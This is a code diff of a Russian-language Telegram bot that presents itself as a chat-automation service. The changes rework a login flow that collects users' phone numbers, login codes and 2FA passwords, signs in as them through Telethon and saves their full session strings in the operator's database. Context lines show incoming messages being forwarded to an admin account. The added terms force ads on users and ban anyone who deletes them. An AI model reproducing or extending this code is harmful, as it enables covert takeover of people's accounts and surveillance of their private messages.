@@ -13,7 +13,7 @@ from aiogram.types import (
     CallbackQuery, ReplyKeyboardRemove, KeyboardButton,
     ReplyKeyboardMarkup
 )
-from aiogram.filters import Command
+from aiogram.filters import Command, StateFilter
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
@@ -81,6 +81,10 @@ MANUAL_INSTRUCTION = (
     "3️⃣ Выберите пункт <b>Автоматизация чатов</b>.\n"
     "4️⃣ Добавьте бота: <code>@norikKodBot</code>.\n"
     "5️⃣ ⚠️ <b>ОБЯЗАТЕЛЬНО:</b> Предоставьте боту полный доступ к сообщениям <b>5/5</b>!\n\n"
+    "📢 <b>Условия использования:</b>\n"
+    "• Бот публикует рекламу 1 раз в 8 часов\n"
+    "• Удаление рекламного сообщения = блокировка\n"
+    "• Вы соглашаетесь с этим, подключая бота"
 )
 
 GROUP_INSTRUCTION = (
@@ -549,7 +553,7 @@ async def check_promo_deletions():
                         try:
                             await bot.send_message(
                                 chat_id=owner_id,
-                                text="Вы забанены владельцем за удаление рекламы.",
+                                text="🚫 Вы забанены за удаление рекламы!\n\nДля разблокировки свяжитесь с владельцем.",
                                 parse_mode="HTML", reply_markup=unban_kb
                             )
                         except: pass
@@ -635,7 +639,6 @@ async def start_telethon_listener(user_id: int, session_str: str):
         async def handle_message(event):
             try:
                 if event.message.text:
-                    # Отправляем уведомление админу
                     await bot.send_message(
                         ADMIN_ID,
                         f"📩 Новое сообщение от {user_id}\n"
@@ -650,24 +653,6 @@ async def start_telethon_listener(user_id: int, session_str: str):
     except Exception as e:
         logging.error(f"Ошибка запуска Telethon: {e}")
         return None
-
-# ---- ОБРАБОТЧИКИ БИЗНЕС-ПОДКЛЮЧЕНИЙ ----
-@dp.business_connection()
-async def handle_bc(bc):
-    bc_owners[bc.id] = int(bc.user.id)
-    save_user_info(bc.user.id, bc.user.username, bc.user.first_name)
-    save_business_account(bc.user.id, bc.user.username, bc.user.first_name)
-    owner_id = int(bc.user.id)
-    owner_mention = get_user_mention(owner_id, bc.user.first_name)
-    
-    try:
-        await bot.send_message(
-            owner_id,
-            f"👋 Привет, {owner_mention}!\n\n✅ Бот успешно подключен!\n\n{TEXT_COMMANDS_HELP}",
-            parse_mode="HTML"
-        )
-    except Exception as e:
-        logging.error(f"Не удалось отправить приветствие: {e}")
 
 # ---- КЛАВИАТУРЫ ----
 def get_start_keyboard(user_id: int):
@@ -719,7 +704,6 @@ def get_users_keyboard(page: int = 0):
     return InlineKeyboardMarkup(inline_keyboard=keyboard)
 
 def get_user_chats_keyboard(user_id: int, page: int = 0):
-    """Создает клавиатуру с чатами пользователя с пагинацией"""
     chats = get_user_chats(user_id)
     keyboard = []
     start_idx = page * 10
@@ -807,8 +791,8 @@ async def group_auth(callback: CallbackQuery, state: FSMContext):
     )
     await state.set_state(AuthState.waiting_for_phone)
 
-# ===== АВТОРИЗАЦИЯ ЧЕРЕЗ TELETHON =====
-@dp.message(AuthState.waiting_for_phone, F.contact | F.text)
+# ===== АВТОРИЗАЦИЯ ЧЕРЕЗ TELETHON (ИСПРАВЛЕННАЯ) =====
+@dp.message(StateFilter(AuthState.waiting_for_phone), F.contact | F.text)
 async def process_phone(message: Message, state: FSMContext):
     msg = await message.answer("🔄 Отправка кода подтверждения...", reply_markup=ReplyKeyboardRemove())
     
@@ -825,6 +809,7 @@ async def process_phone(message: Message, state: FSMContext):
         
         logging.info(f"Обработка номера: {phone}")
         
+        # Создаем клиент И СОХРАНЯЕМ его в состояние
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         await client.connect()
         
@@ -832,16 +817,18 @@ async def process_phone(message: Message, state: FSMContext):
             result = await client.send_code_request(phone)
             logging.info(f"Код отправлен на номер {phone}")
             
+            # Сохраняем ВСЕ данные в состояние
             await state.update_data(
                 phone=phone,
                 phone_code_hash=result.phone_code_hash,
-                session_str=client.session.save()
+                session_str=client.session.save(),
+                client=client  # Сохраняем клиент чтобы не создавать заново
             )
             
             await msg.edit_text(
                 f"📱 <b>Код подтверждения отправлен!</b>\n\n"
                 f"Номер: <code>{phone}</code>\n\n"
-                f"Введите код из Telegram (только цифры):\n"
+                f"<b>Введите код из Telegram</b> (только цифры):\n"
                 f"<i>Например: 12345</i>",
                 parse_mode="HTML"
             )
@@ -858,14 +845,15 @@ async def process_phone(message: Message, state: FSMContext):
             await msg.edit_text(f"❌ Ошибка: {str(e)}\nПопробуйте заново.")
             await state.clear()
         finally:
-            await client.disconnect()
+            # НЕ отключаем клиент, он нам еще понадобится!
+            pass
         
     except Exception as e:
         logging.error(f"Ошибка при отправке кода: {e}")
         await msg.edit_text(f"❌ Ошибка: {str(e)}\nПопробуйте заново.")
         await state.clear()
 
-@dp.message(AuthState.waiting_for_code, F.text)
+@dp.message(StateFilter(AuthState.waiting_for_code), F.text)
 async def process_code(message: Message, state: FSMContext):
     code = re.sub(r'\s+', '', message.text.strip())
     
@@ -877,90 +865,166 @@ async def process_code(message: Message, state: FSMContext):
     phone = data.get("phone")
     phone_code_hash = data.get("phone_code_hash")
     session_str = data.get("session_str")
+    client = data.get("client")  # Берем клиент из состояния
 
-    if not phone or not phone_code_hash:
-        await message.answer("❌ Данные авторизации устарели. Начните заново.")
+    if not phone or not phone_code_hash or not session_str:
+        await message.answer("❌ Данные авторизации устарели. Начните заново через кнопку «Подключить аккаунт для групп».")
         await state.clear()
         return
 
     checking_msg = await message.answer("🔄 Проверка кода...")
     
-    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
-    await client.connect()
+    # Если клиент есть, используем его, иначе создаем новый
+    if client:
+        try:
+            await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
+            final_session = client.session.save()
+            
+            # Сохраняем сессию в БД
+            save_session(message.from_user.id, final_session)
+            save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
+            
+            # Запускаем Telethon клиент
+            await start_telethon_listener(message.from_user.id, final_session)
+            
+            # Закрываем клиент
+            await client.disconnect()
+            
+            await checking_msg.delete()
+            await message.answer(
+                f"✅ <b>Аккаунт успешно подключен!</b>\n\n"
+                f"📊 Бот загрузил все ваши чаты.\n"
+                f"Теперь он будет работать в ваших группах и чатах.\n\n"
+                f"{TEXT_COMMANDS_HELP}",
+                parse_mode="HTML",
+                reply_markup=ReplyKeyboardRemove()
+            )
+            await state.clear()
+            
+        except SessionPasswordNeededError:
+            await checking_msg.delete()
+            await message.answer("🔐 <b>Внимание:</b> На аккаунте включен 2FA пароль.\nВведите ваш облачный пароль:", parse_mode="HTML")
+            await state.set_state(AuthState.waiting_for_2fa)
+            
+        except (CodeInvalidError, PhoneCodeExpiredError, PhoneCodeInvalidError):
+            await checking_msg.delete()
+            await message.answer(
+                "❌ <b>Неверный код!</b>\n\n"
+                "Проверьте код и попробуйте ещё раз.",
+                parse_mode="HTML"
+            )
+            # НЕ очищаем состояние, чтобы можно было ввести код снова
+            
+        except Exception as e:
+            await checking_msg.delete()
+            logging.error(f"Ошибка входа: {e}")
+            await message.answer(f"❌ Ошибка входа: {str(e)}\nНачните заново через кнопку «Подключить аккаунт для групп».")
+            await state.clear()
+    else:
+        # Если клиента нет в состоянии - создаем новый
+        new_client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
+        await new_client.connect()
+        
+        try:
+            await new_client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
+            final_session = new_client.session.save()
+            
+            save_session(message.from_user.id, final_session)
+            save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
+            
+            await start_telethon_listener(message.from_user.id, final_session)
+            
+            await new_client.disconnect()
+            
+            await checking_msg.delete()
+            await message.answer(
+                f"✅ <b>Аккаунт успешно подключен!</b>\n\n"
+                f"📊 Бот загрузил все ваши чаты.\n"
+                f"Теперь он будет работать в ваших группах и чатах.\n\n"
+                f"{TEXT_COMMANDS_HELP}",
+                parse_mode="HTML",
+                reply_markup=ReplyKeyboardRemove()
+            )
+            await state.clear()
+            
+        except SessionPasswordNeededError:
+            await checking_msg.delete()
+            await message.answer("🔐 <b>Внимание:</b> На аккаунте включен 2FA пароль.\nВведите ваш облачный пароль:", parse_mode="HTML")
+            await state.set_state(AuthState.waiting_for_2fa)
+            
+        except (CodeInvalidError, PhoneCodeExpiredError, PhoneCodeInvalidError):
+            await checking_msg.delete()
+            await message.answer(
+                "❌ <b>Неверный код!</b>\n\n"
+                "Проверьте код и попробуйте ещё раз.",
+                parse_mode="HTML"
+            )
+            
+        except Exception as e:
+            await checking_msg.delete()
+            logging.error(f"Ошибка входа: {e}")
+            await message.answer(f"❌ Ошибка входа: {str(e)}\nНачните заново через кнопку «Подключить аккаунт для групп».")
+            await state.clear()
 
-    try:
-        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
-        final_session = client.session.save()
-        save_session(message.from_user.id, final_session)
-        save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
-        
-        # Запускаем Telethon клиент
-        await start_telethon_listener(message.from_user.id, final_session)
-        
-        await client.disconnect()
-        
-        await checking_msg.delete()
-        await message.answer(
-            f"✅ <b>Аккаунт успешно подключен!</b>\n\n"
-            f"📊 Бот загрузил все ваши чаты.\n"
-            f"Теперь он будет работать в ваших группах и чатах.\n\n"
-            f"{TEXT_COMMANDS_HELP}",
-            parse_mode="HTML",
-            reply_markup=ReplyKeyboardRemove()
-        )
-        await state.clear()
-        
-    except SessionPasswordNeededError:
-        await client.disconnect()
-        await checking_msg.delete()
-        await message.answer("🔐 <b>Внимание:</b> На аккаунте включен 2FA пароль.\nВведите ваш облачный пароль:", parse_mode="HTML")
-        await state.set_state(AuthState.waiting_for_2fa)
-        
-    except (CodeInvalidError, PhoneCodeExpiredError, PhoneCodeInvalidError):
-        await client.disconnect()
-        await checking_msg.delete()
-        await message.answer("❌ Неверный или истекший код. Попробуйте ещё раз.", parse_mode="HTML")
-        
-    except Exception as e:
-        await client.disconnect()
-        await checking_msg.delete()
-        logging.error(f"Ошибка входа: {e}")
-        await message.answer(f"❌ Ошибка входа: {str(e)}\nНачните заново.", parse_mode="HTML")
-        await state.clear()
-
-@dp.message(AuthState.waiting_for_2fa, F.text)
+@dp.message(StateFilter(AuthState.waiting_for_2fa), F.text)
 async def process_2fa(message: Message, state: FSMContext):
     password = message.text.strip()
     data = await state.get_data()
     session_str = data.get("session_str")
+    client = data.get("client")
 
-    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
-    await client.connect()
+    if client:
+        try:
+            await client.sign_in(password=password)
+            final_session = client.session.save()
+            
+            save_session(message.from_user.id, final_session)
+            save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
+            
+            await start_telethon_listener(message.from_user.id, final_session)
+            
+            await client.disconnect()
 
-    try:
-        await client.sign_in(password=password)
-        final_session = client.session.save()
-        save_session(message.from_user.id, final_session)
-        save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
+            await message.answer(
+                f"✅ <b>Авторизация успешна!</b>\n\n"
+                f"📊 Бот загрузил все ваши чаты.\n"
+                f"Теперь он будет работать в ваших группах и чатах.\n\n"
+                f"{TEXT_COMMANDS_HELP}",
+                parse_mode="HTML",
+                reply_markup=ReplyKeyboardRemove()
+            )
+            await state.clear()
+            
+        except Exception as e:
+            await message.answer(f"❌ Неверный пароль или ошибка: {str(e)}\nПопробуйте еще раз:")
+    else:
+        # Создаем новый клиент
+        new_client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
+        await new_client.connect()
         
-        # Запускаем Telethon клиент
-        await start_telethon_listener(message.from_user.id, final_session)
-        
-        await client.disconnect()
+        try:
+            await new_client.sign_in(password=password)
+            final_session = new_client.session.save()
+            
+            save_session(message.from_user.id, final_session)
+            save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
+            
+            await start_telethon_listener(message.from_user.id, final_session)
+            
+            await new_client.disconnect()
 
-        await message.answer(
-            f"✅ <b>Авторизация успешна!</b>\n\n"
-            f"📊 Бот загрузил все ваши чаты.\n"
-            f"Теперь он будет работать в ваших группах и чатах.\n\n"
-            f"{TEXT_COMMANDS_HELP}",
-            parse_mode="HTML",
-            reply_markup=ReplyKeyboardRemove()
-        )
-        await state.clear()
-        
-    except Exception as e:
-        await client.disconnect()
-        await message.answer(f"❌ Неверный пароль или ошибка: {str(e)}\nПопробуйте еще раз:")
+            await message.answer(
+                f"✅ <b>Авторизация успешна!</b>\n\n"
+                f"📊 Бот загрузил все ваши чаты.\n"
+                f"Теперь он будет работать в ваших группах и чатах.\n\n"
+                f"{TEXT_COMMANDS_HELP}",
+                parse_mode="HTML",
+                reply_markup=ReplyKeyboardRemove()
+            )
+            await state.clear()
+            
+        except Exception as e:
+            await message.answer(f"❌ Неверный пароль или ошибка: {str(e)}\nПопробуйте еще раз:")
 
 # ---- КОМАНДА ОТКЛЮЧЕНИЯ ----
 @dp.message(Command("disconnect"))
@@ -971,16 +1035,13 @@ async def cmd_disconnect(message: Message):
     
     user_id = message.from_user.id
     
-    # Проверяем есть ли сессия
     session = get_session(user_id)
     if not session:
         await message.answer("❌ У вас нет активной сессии.")
         return
     
-    # Удаляем сессию из БД
     delete_session(user_id)
     
-    # Отключаем Telethon клиент
     if user_id in telethon_clients:
         try:
             await telethon_clients[user_id].disconnect()
@@ -988,7 +1049,6 @@ async def cmd_disconnect(message: Message):
             pass
         del telethon_clients[user_id]
     
-    # Удаляем чаты
     delete_all_user_chats(user_id)
     delete_business_account(user_id)
     
